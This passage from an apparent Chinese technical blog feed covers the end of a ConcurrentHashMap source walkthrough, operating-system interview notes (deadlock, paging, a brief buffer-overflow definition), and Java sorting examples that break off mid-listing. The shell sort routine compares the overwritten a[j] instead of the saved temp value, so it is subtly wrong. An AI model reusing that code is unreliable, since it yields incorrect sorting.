nextTab</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 下面这个 for 循环，最难理解的在前面，而要看懂它们，应该先看懂后面的，然后再倒回来看</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// i 是位置索引，bound 是边界，注意是从后往前</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, bound = <span class="number">0</span>;;) &#123;</span><br><span class="line">        Node&lt;K,V&gt; f; <span class="keyword">int</span> fh;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 下面这个 while 真的是不好理解</span></span><br><span class="line">        <span class="comment">// advance 为 true 表示可以进行下一个位置的迁移了</span></span><br><span class="line">        <span class="comment">//   简单理解结局：i 指向了 transferIndex，bound 指向了 transferIndex-stride</span></span><br><span class="line">        <span class="keyword">while</span> (advance) &#123;</span><br><span class="line">            <span class="keyword">int</span> nextIndex, nextBound;</span><br><span class="line">            <span class="keyword">if</span> (--i &gt;= bound || finishing)</span><br><span class="line">                advance = <span class="keyword">false</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 将 transferIndex 值赋给 nextIndex</span></span><br><span class="line">            <span class="comment">// 这里 transferIndex 一旦小于等于 0，说明原数组的所有位置都有相应的线程去处理了</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((nextIndex = transferIndex) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                i = -<span class="number">1</span>;</span><br><span class="line">                advance = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt</span><br><span class="line">                     (<span class="keyword">this</span>, TRANSFERINDEX, nextIndex,</span><br><span class="line">                      nextBound = (nextIndex &gt; stride ?</span><br><span class="line">                                   nextIndex - stride : <span class="number">0</span>))) &#123;</span><br><span class="line">                <span class="comment">// 看括号中的代码，nextBound 是这次迁移任务的边界，注意，是从后往前</span></span><br><span class="line">                bound = nextBound;</span><br><span class="line">                i = nextIndex - <span class="number">1</span>;</span><br><span class="line">                advance = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= n || i + n &gt;= nextn) &#123;</span><br><span class="line">            <span class="keyword">int</span> sc;</span><br><span class="line">            <span class="keyword">if</span> (finishing) &#123;</span><br><span class="line">                <span class="comment">// 所有的迁移操作已经完成</span></span><br><span class="line">                nextTable = <span class="keyword">null</span>;</span><br><span class="line">                <span class="comment">// 将新的 nextTab 赋值给 table 属性，完成迁移</span></span><br><span class="line">                table = nextTab;</span><br><span class="line">                <span class="comment">// 重新计算 sizeCtl：n 是原数组长度，所以 sizeCtl 得出的值将是新数组长度的 0.75 倍</span></span><br><span class="line">                sizeCtl = (n &lt;&lt; <span class="number">1</span>) - (n &gt;&gt;&gt; <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 之前我们说过，sizeCtl 在迁移前会设置为 (rs &lt;&lt; RESIZE_STAMP_SHIFT) + 2</span></span><br><span class="line">            <span class="comment">// 然后，每有一个线程参与迁移就会将 sizeCtl 加 1，</span></span><br><span class="line">            <span class="comment">// 这里使用 CAS 操作对 sizeCtl 进行减 1，代表做完了属于自己的任务</span></span><br><span class="line">            <span class="keyword">if</span> (U.compareAndSwapInt(<span class="keyword">this</span>, SIZECTL, sc = sizeCtl, sc - <span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="comment">// 任务结束，方法退出</span></span><br><span class="line">                <span class="keyword">if</span> ((sc - <span class="number">2</span>) != resizeStamp(n) &lt;&lt; RESIZE_STAMP_SHIFT)</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 到这里，说明 (sc - 2) == resizeStamp(n) &lt;&lt; RESIZE_STAMP_SHIFT，</span></span><br><span class="line">                <span class="comment">// 也就是说，所有的迁移任务都做完了，也就会进入到上面的 if(finishing)&#123;&#125; 分支了</span></span><br><span class="line">                finishing = advance = <span class="keyword">true</span>;</span><br><span class="line">                i = n; <span class="comment">// recheck before commit</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果位置 i 处是空的，没有任何节点，那么放入刚刚初始化的 ForwardingNode ”空节点“</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((f = tabAt(tab, i)) == <span class="keyword">null</span>)</span><br><span class="line">            advance = casTabAt(tab, i, <span class="keyword">null</span>, fwd);</span><br><span class="line">        <span class="comment">// 该位置处是一个 ForwardingNode，代表该位置已经迁移过了</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((fh = f.hash) == MOVED)</span><br><span class="line">            advance = <span class="keyword">true</span>; <span class="comment">// already processed</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 对数组该位置处的结点加锁，开始处理数组该位置处的迁移工作</span></span><br><span class="line">            <span class="keyword">synchronized</span> (f) &#123;</span><br><span class="line">                <span class="keyword">if</span> (tabAt(tab, i) == f) &#123;</span><br><span class="line">                    Node&lt;K,V&gt; ln, hn;</span><br><span class="line">                    <span class="comment">// 头结点的 hash 大于 0，说明是链表的 Node 节点</span></span><br><span class="line">                    <span class="keyword">if</span> (fh &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// 下面这一块和 Java7 中的 ConcurrentHashMap 迁移是差不多的，</span></span><br><span class="line">                        <span class="comment">// 需要将链表一分为二，</span></span><br><span class="line">                        <span class="comment">//   找到原链表中的 lastRun，然后 lastRun 及其之后的节点是一起进行迁移的</span></span><br><span class="line">                        <span class="comment">//   lastRun 之前的节点需要进行克隆，然后分到两个链表中</span></span><br><span class="line">                        <span class="keyword">int</span> runBit = fh &amp; n;</span><br><span class="line">                        Node&lt;K,V&gt; lastRun = f;</span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; p = f.next; p != <span class="keyword">null</span>; p = p.next) &#123;</span><br><span class="line">                            <span class="keyword">int</span> b = p.hash &amp; n;</span><br><span class="line">                            <span class="keyword">if</span> (b != runBit) &#123;</span><br><span class="line">                                runBit = b;</span><br><span class="line">                                lastRun = p;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (runBit == <span class="number">0</span>) &#123;</span><br><span class="line">                            ln = lastRun;</span><br><span class="line">                            hn = <span class="keyword">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            hn = lastRun;</span><br><span class="line">                            ln = <span class="keyword">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; p = f; p != lastRun; p = p.next) &#123;</span><br><span class="line">                            <span class="keyword">int</span> ph = p.hash; K pk = p.key; V pv = p.val;</span><br><span class="line">                            <span class="keyword">if</span> ((ph &amp; n) == <span class="number">0</span>)</span><br><span class="line">                                ln = <span class="keyword">new</span> Node&lt;K,V&gt;(ph, pk, pv, ln);</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                hn = <span class="keyword">new</span> Node&lt;K,V&gt;(ph, pk, pv, hn);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 其中的一个链表放在新数组的位置 i</span></span><br><span class="line">                        setTabAt(nextTab, i, ln);</span><br><span class="line">                        <span class="comment">// 另一个链表放在新数组的位置 i+n</span></span><br><span class="line">                        setTabAt(nextTab, i + n, hn);</span><br><span class="line">                        <span class="comment">// 将原数组该位置处设置为 fwd，代表该位置已经处理完毕，</span></span><br><span class="line">                        <span class="comment">//    其他线程一旦看到该位置的 hash 值为 MOVED，就不会进行迁移了</span></span><br><span class="line">                        setTabAt(tab, i, fwd);</span><br><span class="line">                        <span class="comment">// advance 设置为 true，代表该位置已经迁移完毕</span></span><br><span class="line">                        advance = <span class="keyword">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (f <span class="keyword">instanceof</span> TreeBin) &#123;</span><br><span class="line">                        <span class="comment">// 红黑树的迁移</span></span><br><span class="line">                        TreeBin&lt;K,V&gt; t = (TreeBin&lt;K,V&gt;)f;</span><br><span class="line">                        TreeNode&lt;K,V&gt; lo = <span class="keyword">null</span>, loTail = <span class="keyword">null</span>;</span><br><span class="line">                        TreeNode&lt;K,V&gt; hi = <span class="keyword">null</span>, hiTail = <span class="keyword">null</span>;</span><br><span class="line">                        <span class="keyword">int</span> lc = <span class="number">0</span>, hc = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; e = t.first; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">                            <span class="keyword">int</span> h = e.hash;</span><br><span class="line">                            TreeNode&lt;K,V&gt; p = <span class="keyword">new</span> TreeNode&lt;K,V&gt;</span><br><span class="line">                                (h, e.key, e.val, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">                            <span class="keyword">if</span> ((h &amp; n) == <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> ((p.prev = loTail) == <span class="keyword">null</span>)</span><br><span class="line">                                    lo = p;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    loTail.next = p;</span><br><span class="line">                                loTail = p;</span><br><span class="line">                                ++lc;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> ((p.prev = hiTail) == <span class="keyword">null</span>)</span><br><span class="line">                                    hi = p;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    hiTail.next = p;</span><br><span class="line">                                hiTail = p;</span><br><span class="line">                                ++hc;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 如果一分为二后，节点数少于 8，那么将红黑树转换回链表</span></span><br><span class="line">                        ln = (lc &lt;= UNTREEIFY_THRESHOLD) ? untreeify(lo) :</span><br><span class="line">                            (hc != <span class="number">0</span>) ? <span class="keyword">new</span> TreeBin&lt;K,V&gt;(lo) : t;</span><br><span class="line">                        hn = (hc &lt;= UNTREEIFY_THRESHOLD) ? untreeify(hi) :</span><br><span class="line">                            (lc != <span class="number">0</span>) ? <span class="keyword">new</span> TreeBin&lt;K,V&gt;(hi) : t;</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment">// 将 ln 放置在新数组的位置 i</span></span><br><span class="line">                        setTabAt(nextTab, i, ln);</span><br><span class="line">                        <span class="comment">// 将 hn 放置在新数组的位置 i+n</span></span><br><span class="line">                        setTabAt(nextTab, i + n, hn);</span><br><span class="line">                        <span class="comment">// 将原数组该位置处设置为 fwd，代表该位置已经处理完毕，</span></span><br><span class="line">                        <span class="comment">//    其他线程一旦看到该位置的 hash 值为 MOVED，就不会进行迁移了</span></span><br><span class="line">                        setTabAt(tab, i, fwd);</span><br><span class="line">                        <span class="comment">// advance 设置为 true，代表该位置已经迁移完毕</span></span><br><span class="line">                        advance = <span class="keyword">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说到底，transfer 这个方法并没有实现所有的迁移任务，每次调用这个方法只实现了 transferIndex 往前 stride 个位置的迁移工作，其他的需要由外围来控制。</p><p>这个时候，再回去仔细看 tryPresize 方法可能就会更加清晰一些了。</p><h3><span id="get-过程分析">get 过程分析</span></h3><p>get 方法从来都是最简单的，这里也不例外：</p><ol><li>计算 hash 值</li><li>根据 hash 值找到数组对应位置: (n - 1) &amp; h</li><li>根据该位置处结点性质进行相应查找<ul><li>如果该位置为 null，那么直接返回 null 就可以了</li><li>如果该位置处的节点刚好就是我们需要的，返回该节点的值即可</li><li>如果该位置节点的 hash 值小于 0，说明正在扩容，或者是红黑树，后面我们再介绍 find 方法</li><li>如果以上 3 条都不满足，那就是链表，进行遍历比对即可</li></ul></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; e, p; <span class="keyword">int</span> n, eh; K ek;</span><br><span class="line">    <span class="keyword">int</span> h = spread(key.hashCode());</span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (e = tabAt(tab, (n - <span class="number">1</span>) &amp; h)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 判断头结点是否就是我们需要的节点</span></span><br><span class="line">        <span class="keyword">if</span> ((eh = e.hash) == h) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((ek = e.key) == key || (ek != <span class="keyword">null</span> &amp;&amp; key.equals(ek)))</span><br><span class="line">                <span class="keyword">return</span> e.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果头结点的 hash 小于 0，说明 正在扩容，或者该位置是红黑树</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (eh &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 参考 ForwardingNode.find(int h, Object k) 和 TreeBin.find(int h, Object k)</span></span><br><span class="line">            <span class="keyword">return</span> (p = e.find(h, key)) != <span class="keyword">null</span> ? p.val : <span class="keyword">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 遍历链表</span></span><br><span class="line">        <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e.hash == h &amp;&amp;</span><br><span class="line">                ((ek = e.key) == key || (ek != <span class="keyword">null</span> &amp;&amp; key.equals(ek))))</span><br><span class="line">                <span class="keyword">return</span> e.val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单说一句，此方法的大部分内容都很简单，只有正好碰到扩容的情况，ForwardingNode.find(int h, Object k) 稍微复杂一些，不过在了解了数据迁移的过程后，这个也就不难了，所以限于篇幅这里也不展开说了。</p><h2><span id="总结">总结</span></h2><p>其实也不是很难嘛，虽然没有像之前的 AQS 和线程池一样一行一行源码进行分析，但还是把所有初学者可能会糊涂的地方都进行了深入的介绍，只要是稍微有点基础的读者，应该是很容易就能看懂 HashMap 和 ConcurrentHashMap 源码了。</p><p>看源码不算是目的吧，深入地了解 Doug Lea 的设计思路，我觉得还挺有趣的，大师就是大师，代码写得真的是好啊。</p><p>我发现很多人都以为我写博客主要是源码分析，说真的，我对于源码分析没有那么大热情，主要都是为了用源码说事罢了，可能之后的文章还是会有比较多的源码分析成分。</p><p>不要脸地自以为本文的质量还是挺高的，信息量比较大，如果你觉得有写得不好的地方，或者说看完本文你还是没看懂它们，那么请提出来<del>~</del></p><p>（全文完）</p>]]></content>
      
      
      <categories>
          
          <category> 源码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HashMap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统</title>
      <link href="/2020/04/12/os/"/>
      <url>/2020/04/12/os/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>整理了操作系统的常考知识点</p><a id="more"></a><!-- toc --><ul><li><a href="#什么是死锁死锁产生的条件">什么是死锁？死锁产生的条件？</a></li><li><a href="#分页和分段有什么区别">分页和分段有什么区别？</a></li><li><a href="#什么是缓冲区溢出有什么危害">什么是缓冲区溢出？有什么危害？</a></li></ul><!-- tocstop --><h1><span id="什么是死锁死锁产生的条件">什么是死锁？死锁产生的条件？</span></h1><p><strong>什么是死锁：</strong></p><p>两个或多个进程无限期的阻塞、相互等待的一种状态。</p><p><strong>死锁产生的四个必要条件：</strong></p><p>（有一个条件不成立，则不会产生死锁）</p><p>1、互斥条件：一个资源一次只能被一个进程使用</p><p>2、请求与保持条件：一个进程因请求资源而阻塞时，对已获得资源保持不放</p><p>3、不剥夺条件：进程获得的资源，在未完全使用完之前，不能强行剥夺</p><p>4、循环等待条件：若干进程之间形成一种头尾相接的环形等待资源关系</p><p><strong>解决死锁的方法有：</strong></p><p>预防死锁、避免死锁、检测死锁、解除死锁</p><p><strong>解决死锁的策略有：</strong></p><p>鸵鸟策略、预防策略、避免策略、检测与解除死锁</p><h1><span id="分页和分段有什么区别">分页和分段有什么区别？</span></h1><p>1、段是信息的逻辑单位，它是根据用户的需要划分的，因此段对用户是可见的 ；页是信息的物理单位，是为了管理主存的方便而划分的，对用户是透明的。</p><p>2、段的大小不固定，有它所完成的功能决定；页大大小固定，由系统决定</p><p>3、段向用户提供二维地址空间；页向用户提供的是一维地址空间</p><p>4、段是信息的逻辑单位，便于存储保护和信息的共享，页的保护和共享受到限制。</p><h1><span id="什么是缓冲区溢出有什么危害">什么是缓冲区溢出？有什么危害？</span></h1><p>缓冲区溢出是指当计算机向缓冲区填充数据时超出了缓冲区本身的容量，溢出的数据覆盖在合法数据上。</p><p>危害有以下两点：</p><p>（1）程序崩溃，导致拒绝服务</p><p>（2）跳转并且执行一段恶意代码</p><p>造成缓冲区溢出的主要原因是程序中没有仔细检查用户输入。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sorting</title>
      <link href="/2020/04/11/sorting/"/>
      <url>/2020/04/11/sorting/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><!-- toc --><ul><li><a href="#冒泡排序">冒泡排序 √</a></li><li><a href="#插入排序">插入排序 √</a></li><li><a href="#希尔排序-">希尔排序 -</a></li><li><a href="#选择排序-">选择排序 -</a></li><li><a href="#快速排序-">快速排序 -</a><ul><li><a href="#快速选择-">快速选择 -</a></li></ul></li><li><a href="#归并排序-">归并排序 -</a></li><li><a href="#堆排序-">堆排序 -</a></li><li><a href="#总结">总结</a></li></ul><!-- tocstop --><h1><span id="冒泡排序">冒泡排序 √</span></h1><p>设数组长度为N。</p><p>1．比较相邻的前后二个数据，如果前面数据大于后面的数据，就将二个数据交换。</p><p>2．这样对数组的第0个数据到N-1个数据进行一次遍历后，最大的一个数据就“沉”到数组第N-1个位置。</p><p>3．N=N-1，如果N不为0就重复前面二步，否则排序完成。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sort(<span class="keyword">int</span> a[])&#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.length-<span class="number">1</span>; i++) &#123;</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; a.length-i-<span class="number">1</span>; j++) &#123;</span><br><span class="line">               <span class="keyword">if</span> (a[j+<span class="number">1</span>]&lt;a[j]) swap(a,j,j+<span class="number">1</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> a;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> tmp = a[i];</span><br><span class="line">       a[i]=a[j];</span><br><span class="line">       a[j]=tmp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="插入排序">插入排序 √</span></h1><p>直接插入排序(Insertion Sort)的基本思想是：每次将一个待排序的记录，按其关键字大小插入到前面已经排好序的子序列中的适当位置，直到全部记录插入完成为止。 </p><p>设数组为a[0…n-1]。</p><ol><li><p>初始时，a[0]自成1个有序区，无序区为a[1..n-1]。令i=1</p></li><li><p>将a[i]并入当前的有序区a[0…i-1]中形成a[0…i]的有序区间。</p></li><li><p>i++并重复第二步直到i==n-1。排序完成。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Insertsort2</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i, j;</span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">         <span class="keyword">if</span> (a[i] &lt; a[i - <span class="number">1</span>])</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">int</span> temp = a[i];</span><br><span class="line">             j = i - <span class="number">1</span>;</span><br><span class="line">             <span class="keyword">for</span> (; j &gt;= <span class="number">0</span> &amp;&amp; a[j] &gt; temp; j--)</span><br><span class="line">                 a[j + <span class="number">1</span>] = a[j];</span><br><span class="line">             a[j + <span class="number">1</span>] = temp;</span><br><span class="line">         &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1><span id="希尔排序-">希尔排序 -</span></h1></li></ol><p>希尔排序的实质就是分组插入排序，该方法又称缩小增量排序，因DL．Shell于1959年提出而得名。</p><p>该方法的基本思想是：先将整个待排元素序列分割成若干个子序列（由相隔某个“增量”的元素组成的）分别进行直接插入排序，然后依次缩减增量再进行排序，待整个序列中的元素基本有序（增量足够小）时，再对全体元素进行一次直接插入排序。因为直接插入排序在元素基本有序的情况下（接近最好情况），效率是很高的，因此希尔排序在时间效率上比前两种方法有较大提高。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] shellsort(<span class="keyword">int</span> a[])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> j, gap;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (gap = a.length / <span class="number">2</span>; gap &gt; <span class="number">0</span>; gap /= <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">for</span> (j = gap; j &lt; a.length; j++)<span class="comment">//从数组第gap个元素开始</span></span><br><span class="line">                <span class="keyword">if</span> (a[j] &lt; a[j - gap])<span class="comment">//每个元素与自己组内的数据进行直接插入排序</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">int</span> temp = a[j];</span><br><span class="line">                    <span class="keyword">int</span> k = j - gap;</span><br><span class="line">                    <span class="keyword">for</span> (; k&gt;=<span class="number">0</span>&amp;&amp;a[j]&lt;a[k]; k-=gap) &#123;</span><br><span class="line">                        a[k+gap]=a[k];</span><br><span class="line">                    &#125;</span><br><span class="line">                    a[k + gap] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="选择排序-">选择排序 -</span></h1><p>直接选择排序和直接插入排序类似，都将数据分为有序区和无序区，所不同的是直接插入排序是将无序区的第一个元素直接插入到有序区以形成一个更大的有序区，而直接选择排序是从无序区选一个最小的元素直接放到有序区的最后。 </p><p>设数组为a[0…n-1]</p><ol><li><p>初始时，数组全为无序区为a[0..n-1]。令i=0</p></li><li><p>在无序区a[i…n-1]中选取一个最小的元素，将其与a[i]交换。交换之后a[0…i]就形成了一个有序区。</p></li><li><p>i++并重复第二步直到i==n-1。排序完成。</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] selectsort(<span class="keyword">int</span> a[])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i, j, nMinIndex;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; a.length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            nMinIndex = i; <span class="comment">//找最小元素的位置</span></span><br><span class="line">            <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; a.length; j++)</span><br><span class="line">                <span class="keyword">if</span> (a[j] &lt; a[nMinIndex])</span><br><span class="line">                    nMinIndex = j;</span><br><span class="line"></span><br><span class="line">            swap(a,i, nMinIndex); <span class="comment">//将这个元素放到无序区的开头</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> tmp = a[i];</span><br><span class="line">       a[i]=a[j];</span><br><span class="line">       a[j]=tmp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="快速排序-">快速排序 -</span></h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] quickSort(<span class="keyword">int</span>[] a)&#123;</span><br><span class="line">    <span class="keyword">return</span> qs(a, <span class="number">0</span>, a.length-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] qs(<span class="keyword">int</span>[] a,<span class="keyword">int</span> lo,<span class="keyword">int</span> hi)&#123;</span><br><span class="line">    <span class="keyword">int</span> i=lo,j=hi;</span><br><span class="line">    <span class="keyword">if</span>(lo&gt;hi) <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">int</span> x = a[i];</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j&amp;&amp;a[j]&gt;=x) j--;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;j) a[i]=a[j];</span><br><span class="line">        <span class="keyword">while</span>(i&lt;j&amp;&amp;a[i]&lt;x) i++;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;j) a[j]=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    a[i]=x;</span><br><span class="line">    qs(a,lo,i-<span class="number">1</span>);</span><br><span class="line">    qs(a,i+<span class="number">1</span>,hi);</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="快速选择-">快速选择 -</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 